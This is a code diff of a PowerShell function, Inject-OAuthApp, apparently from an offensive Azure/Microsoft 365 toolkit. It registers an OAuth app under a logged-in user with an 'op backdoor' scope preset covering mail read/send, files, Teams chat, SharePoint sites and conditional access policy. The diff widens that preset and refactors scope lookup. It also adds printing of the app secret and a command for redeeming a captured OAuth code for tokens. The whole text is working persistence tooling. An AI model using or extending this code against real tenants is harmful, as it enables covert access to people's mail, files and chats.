@@ -56,7 +56,6 @@ function Inject-OAuthApp{
     [string[]]
     $Scope
   )
-
 # Login
 Write-Host -ForegroundColor yellow "[*] First you need to login as the user you want to deploy the app as."
 az login --use-device-code --allow-no-subscriptions
@@ -70,124 +69,32 @@ Write-Output "Graph ID: $graphId"
 Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects:"
 if ($Scope -like "op backdoor")
 {
-    $Scope = "openid","profile","offline_access","email","User.Read","User.ReadBasic.All","Mail.Read","Mail.Send","Mail.Read.Shared","Mail.Send.Shared","Files.ReadWrite.All","EWS.AccessAsUser.All","ChatMessage.Read","ChatMessage.Send","Chat.ReadWrite","Chat.Create","ChannelMessage.Edit","ChannelMessage.Send","Channel.ReadBasic.All","Presence.Read.All","Team.ReadBasic.All","Team.Create"
+    $Scope = "openid","profile","offline_access","email","User.Read","User.ReadBasic.All","Mail.Read","Mail.Send","Mail.Read.Shared","Mail.Send.Shared","Files.ReadWrite.All","EWS.AccessAsUser.All","ChatMessage.Read","ChatMessage.Send","Chat.ReadWrite","Chat.Create","ChannelMessage.Edit","ChannelMessage.Send","Channel.ReadBasic.All","Presence.Read.All","Team.ReadBasic.All","Team.Create","Sites.Manage.All","Sites.Read.All","Sites.ReadWrite.All","Policy.Read.ConditionalAccess"
     Write-Host -ForegroundColor yellow "[*] One overpowered (OP) backdoor is coming right up! Here is the scope:"
 }
-$Scope
 $scopeurl = ""
 $accesslist = ""
+$scopeIds = @{}
+$joinedScope = $Scope -join " "
+$joinedScope
+
+# Loop through each item in $Scope
 foreach ($item in $Scope){
-    if ($item -like "openid"){
-        $openid = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='openid'].id | [0]"
-        $scopeurl = $scopeurl + "openid%20"
-        $accesslist = $accesslist + '{"id": ' + $openid + ',"type": "Scope"},'
-    }
-    elseif ($item -like "profile"){
-        $profile = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='profile'].id | [0]"
-        $scopeurl = $scopeurl + "profile%20"
-        $accesslist = $accesslist + '{"id": ' + $profile + ',"type": "Scope"},'
-    }
-    elseif ($item -like "offline_access"){
-        $offline_access = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='offline_access'].id | [0]"
-        $scopeurl = $scopeurl + "offline_access%20"
-        $accesslist = $accesslist + '{"id": ' + $offline_access + ',"type": "Scope"},'
-    }
-    elseif ($item -like "email"){
-        $email = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='email'].id | [0]"
-        $scopeurl = $scopeurl + "email%20"
-        $accesslist = $accesslist + '{"id": ' + $email + ',"type": "Scope"},'
-    }
-    elseif ($item -like "User.Read"){
-        $userRead = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='User.Read'].id | [0]"
-        $scopeurl = $scopeurl + "User.Read%20"
-        $accesslist = $accesslist + '{"id": ' + $userRead + ',"type": "Scope"},'
-    }
-    elseif ($item -like "User.ReadBasic.All"){
-        $userReadBasicAll = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='User.ReadBasic.All'].id | [0]"
-        $scopeurl = $scopeurl + "User.ReadBasic.All%20"
-        $accesslist = $accesslist + '{"id": ' + $userReadBasicAll + ',"type": "Scope"},'
-    }
-    elseif ($item -like "Mail.Read"){
-        $mailRead = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Mail.Read'].id | [0]"
-        $scopeurl = $scopeurl + "Mail.Read%20"
-        $accesslist = $accesslist + '{"id": ' + $mailRead + ',"type": "Scope"},'
-    }
-    elseif ($item -like "Mail.Send"){
-        $mailSend = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Mail.Send'].id | [0]"
-        $scopeurl = $scopeurl + "Mail.Send%20"
-        $accesslist = $accesslist + '{"id": ' + $mailSend + ',"type": "Scope"},'
-    }
-    elseif ($item -like "Mail.Read.Shared"){
-        $mailReadShared = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Mail.Read.Shared'].id | [0]"
-        $scopeurl = $scopeurl + "Mail.Read.Shared%20"
-        $accesslist = $accesslist + '{"id": ' + $mailReadShared + ',"type": "Scope"},'
-    }
-    elseif ($item -like "Mail.Send.Shared"){
-        $mailSendShared = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Mail.Send.Shared'].id | [0]"
-        $scopeurl = $scopeurl + "Mail.Send.Shared%20"
-        $accesslist = $accesslist + '{"id": ' + $mailSendShared + ',"type": "Scope"},'
-    }
-    elseif ($item -like "Files.ReadWrite.All"){
-        $filesReadWriteAll = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Files.ReadWrite.All'].id | [0]"
-        $scopeurl = $scopeurl + "Files.ReadWrite.All%20"
-        $accesslist = $accesslist + '{"id": ' + $filesReadWriteAll + ',"type": "Scope"},'
-    }
-    elseif ($item -like "EWS.AccessAsUser.All"){
-        $ewsAccessAsUserAll = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='EWS.AccessAsUser.All'].id | [0]"
-        $scopeurl = $scopeurl + "EWS.AccessAsUser.All%20"
-        $accesslist = $accesslist + '{"id": ' + $ewsAccessAsUserAll + ',"type": "Scope"},'
-    }
-    elseif ($item -like "ChatMessage.Read"){
-        $chatMessageRead = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='ChatMessage.Read'].id | [0]"
-        $scopeurl = $scopeurl + "ChatMessage.Read%20"
-        $accesslist = $accesslist + '{"id": ' + $chatMessageRead + ',"type": "Scope"},'
-    }
-    elseif ($item -like "ChatMessage.Send"){
-        $chatMessageSend = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='ChatMessage.Send'].id | [0]"
-        $scopeurl = $scopeurl + "ChatMessage.Send%20"
-        $accesslist = $accesslist + '{"id": ' + $chatMessageSend + ',"type": "Scope"},'
-    }
-    elseif ($item -like "Chat.ReadWrite"){
-        $chatReadWrite = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Chat.ReadWrite'].id | [0]"
-        $scopeurl = $scopeurl + "Chat.ReadWrite%20"
-        $accesslist = $accesslist + '{"id": ' + $chatReadWrite + ',"type": "Scope"},'
-    }
-    elseif ($item -like "Chat.Create"){
-        $chatCreate = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Chat.Create'].id | [0]"
-        $scopeurl = $scopeurl + "Chat.Create%20"
-        $accesslist = $accesslist + '{"id": ' + $chatCreate + ',"type": "Scope"},'
-    }
-    elseif ($item -like "ChannelMessage.Edit"){
-        $channelMessageEdit = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='ChannelMessage.Edit'].id | [0]"
-        $scopeurl = $scopeurl + "ChannelMessage.Edit%20"
-        $accesslist = $accesslist + '{"id": ' + $channelMessageEdit + ',"type": "Scope"},'
-    }
-    elseif ($item -like "ChannelMessage.Send"){
-        $channelMessageSend = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='ChannelMessage.Send'].id | [0]"
-        $scopeurl = $scopeurl + "ChannelMessage.Send%20"
-        $accesslist = $accesslist + '{"id": ' + $channelMessageSend + ',"type": "Scope"},'
-    }
-    elseif ($item -like "Channel.ReadBasic.All"){
-        $channelReadBasicAll = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Channel.ReadBasic.All'].id | [0]"
-        $scopeurl = $scopeurl + "Channel.ReadBasic.All%20"
-        $accesslist = $accesslist + '{"id": ' + $channelReadBasicAll + ',"type": "Scope"},'
-    }
-    elseif ($item -like "Presence.Read.All"){
-        $presenceReadAll = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Presence.Read.All'].id | [0]"
-        $scopeurl = $scopeurl + "Presence.Read.All%20"
-        $accesslist = $accesslist + '{"id": ' + $presenceReadAll + ',"type": "Scope"},'
-    }
-    elseif ($item -like "Team.ReadBasic.All"){
-        $teamReadBasicAll = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Team.ReadBasic.All'].id | [0]"
-        $scopeurl = $scopeurl + "Team.ReadBasic.All%20"
-        $accesslist = $accesslist + '{"id": ' + $teamReadBasicAll + ',"type": "Scope"},'
-    }
-    elseif ($item -like "Team.Create"){
-        $teamCreate = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Team.Create'].id | [0]"
-        $scopeurl = $scopeurl + "Team.Create%20"
-        $accesslist = $accesslist + '{"id": ' + $teamCreate + ',"type": "Scope"},'
+    $variableName = $item -replace "[\W\d]", ""  # Remove non-alphanumeric characters and digits
+    $variableName = $variableName + "Scope"
+    
+    $scopeId = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='$item'].id | [0]"
+    if (!$scopeId){Write-host -foregroundcolor red "[**] Couldn't find scope option $item"}
+    else{
+    Write-Host ($item + " : " + $scopeId)
+    $scopeurl += "$item%20"
+    $accesslist += '{"id": ' + $scopeId + ',"type": "Scope"},'
+    
+    # Store the scope ID in the hashtable
+    $scopeIds[$variableName] = $scopeId
     }
 }
+
 
 Write-Host -ForegroundColor yellow "[*] Finished collecting object IDs of permissions."
 # Create a resources variable
@@ -221,6 +128,11 @@ Write-Host "--------------------------------------------------------"
 Write-Host ("Application ID: " + $app.AppId)
 Write-Host ("Object ID: " + $app.Id)
 Write-Host ("Secret: " + $Secret.Password)
+Write-Host "--------------------------------------------------------"
+Write-Host "After you obtain an OAuth Code from the redirect URI server you can use this command to complete the flow:"
+Write-Host "--------------------------------------------------------"
+$scopeclean = ('"' + $scopeurl.replace('%20', ' ').Trim(" ") + '"')
+Write-Host -ForegroundColor Cyan ('Get-AzureAccessToken -ClientId "' + $app.AppId + '" -ClientSecret "' + $Secret.Password + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean + " -AuthCode <insert your OAuth Code here>")
 }
 
 
